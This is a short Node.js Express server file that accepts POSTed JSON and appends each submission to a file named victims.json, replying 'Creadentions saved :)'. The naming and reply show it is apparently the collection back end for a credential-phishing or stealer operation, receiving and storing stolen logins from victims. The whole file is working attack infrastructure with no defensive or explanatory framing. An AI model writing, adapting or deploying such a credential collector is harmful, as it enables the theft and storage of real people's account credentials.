const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

app.listen(8080, () => {
	console.log("Server is running on port 8080");
});

let victimsData = []; //data array
// const path = "./victims.json";
const path = "./victims.json";


//read victims.json file
fs.readFile(path, "utf8", (err, data) => {
	if (err) {
		console.error(err);
		return;
	}
	victimsData = JSON.parse(data);
});

app.post("/", (req, res) => {
	console.log(req.body); // your JSON

	fs.access(path, fs.F_OK, (err) => {
		if (err) {
			console.error(err);

			//create file
			fs.writeFile(path, "[]", function (err) {
				if (err) throw err;
				console.log("File is created.");
			});
		} else {
			console.log("File exists.");
		}
        victimsData.push(req.body);

        fs.writeFile(path, JSON.stringify(victimsData), (err) => {
            if (err) {
                console.error(err);
            } else {
                console.log("Data written to file");
            }
        });     
        return;
	});
    return res.send("Creadentions saved :)");
});